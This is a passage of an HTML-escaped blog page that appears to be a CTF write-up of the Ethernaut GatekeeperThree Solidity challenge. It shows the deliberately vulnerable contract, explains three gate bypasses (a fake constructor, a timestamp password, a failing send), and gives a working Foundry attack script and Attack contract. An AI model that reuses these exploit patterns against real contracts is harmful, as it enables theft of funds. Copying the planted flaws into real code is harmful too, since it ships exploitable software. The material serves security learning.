&lt;&#x2F;span&gt;&lt;span&gt;      target&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getAllowance&lt;&#x2F;span&gt;&lt;span&gt;(password)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract GatekeeperThree {
&lt;&#x2F;span&gt;&lt;span&gt;  address public owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  address public entrant&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  bool public allowEntrance&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  SimpleTrick public trick&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;construct0r&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;      owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gateOne&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;owner)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(tx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;origin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;owner)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gateTwo&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(allowEntrance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gateThree&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.001 &lt;&#x2F;span&gt;&lt;span&gt;ether &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(owner)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;send&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.001 &lt;&#x2F;span&gt;&lt;span&gt;ether) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;      _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getAllowance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint _password&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(trick&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;checkPassword&lt;&#x2F;span&gt;&lt;span&gt;(_password)) {
&lt;&#x2F;span&gt;&lt;span&gt;        allowEntrance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;createTrick&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    trick &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;SimpleTrick&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    trick&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;trickInit&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;enter&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public gateOne gateTwo gateThree &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    entrant &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;tx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;origin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;receive &lt;&#x2F;span&gt;&lt;span&gt;() external payable {}
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Cope with gates and become an entrant.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Similar to GatekeeperOne and GatekeeperTwo we need to pass the three gate checks by the modifiers when calling the &lt;code&gt;enter()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;gateOne()&lt;&#x2F;code&gt; can be bypassed if we are the owner of the contract and we need call from a contract.&lt;&#x2F;li&gt;
&lt;li&gt;To be be the owner we can call the &lt;code&gt;construct0r()&lt;&#x2F;code&gt; function its not the actual constructor(), so we can be the owner after calling it.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;gateTwo()&lt;&#x2F;code&gt; will be passed if we managed to change the &lt;code&gt;allowEntrance&lt;&#x2F;code&gt; value to true. To do it, we need to call the &lt;code&gt;getAllowance()&lt;&#x2F;code&gt; function with the right password defined inside SimpleTrick contract.&lt;&#x2F;li&gt;
&lt;li&gt;So, we need to deploy a SimpleTrick contract first, we can do this by calling &lt;code&gt;createTrick()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;li&gt;After that we need to find the password stored inside SimpleTrick contract. We can do this by using &lt;code&gt;vm.load&lt;&#x2F;code&gt; cheatcode or we can find the password inside our Attack contract.&lt;&#x2F;li&gt;
&lt;li&gt;Because the password is the &lt;code&gt;block.timestamp&lt;&#x2F;code&gt; which will be same during a transaction. If we deploy the SimpeToken and get the block.timestamp inside same call, the block.timestamp will be the password for us.&lt;&#x2F;li&gt;
&lt;li&gt;Callling &lt;code&gt;getAllowance()&lt;&#x2F;code&gt; with this value will pass the gateTwo.&lt;&#x2F;li&gt;
&lt;li&gt;For &lt;code&gt;gateThree()&lt;&#x2F;code&gt; the balance of the GatekeeperThree should be greater than 0.001 ether and when the GatekeeperThree sends 0.001 ether to owner it should return false.&lt;&#x2F;li&gt;
&lt;li&gt;Remember owner is out attack contract, GatekeeperThree sending ether using &lt;code&gt;send&lt;&#x2F;code&gt; call. &lt;code&gt;send&lt;&#x2F;code&gt; call will return &lt;code&gt;false&lt;&#x2F;code&gt; when the transaction fails.&lt;&#x2F;li&gt;
&lt;li&gt;So, we have to deny the ether sent by the GatekeeperThree. To do this, I haven&#x27;t implemented any fallback or receive function inside my Attack contract.&lt;&#x2F;li&gt;
&lt;li&gt;For this reason the send will return false to GatekeeperThree contract and now we will able to register as entrant.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;GatekeeperThreeSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;GatekeeperThree.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract GatekeeperThreeSolve is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    GatekeeperThree public gate &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GatekeeperThree&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x152e56fe5FEC16f910Ea83294dD321a0c8380193&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Gate Owner : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;gate&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;owner&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; address trick = gate.trick().trick();
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; console.log(&amp;quot;Trick Address : &amp;quot;, trick);
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; bytes32 _password = vm.load(trick, bytes32(uint(2)));
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; uint password = uint(_password);
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; console.log(&amp;quot;Password : &amp;quot;, password);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Attack attack &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;{value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.002 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;ether&lt;&#x2F;span&gt;&lt;span&gt;}()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        attack&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Allow Entrance : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;gate&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;allowEntrance&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Gate Owner : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;gate&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;owner&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Entrant : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;gate&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;entrant&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    GatekeeperThree public gate &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GatekeeperThree&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x152e56fe5FEC16f910Ea83294dD321a0c8380193&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() payable{}
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        gate&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;construct0r&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        gate&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;createTrick&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        gate&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getAllowance&lt;&#x2F;span&gt;&lt;span&gt;(block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;timestamp)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        (bool success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(gate))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;call{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance}(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Tx Failed&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
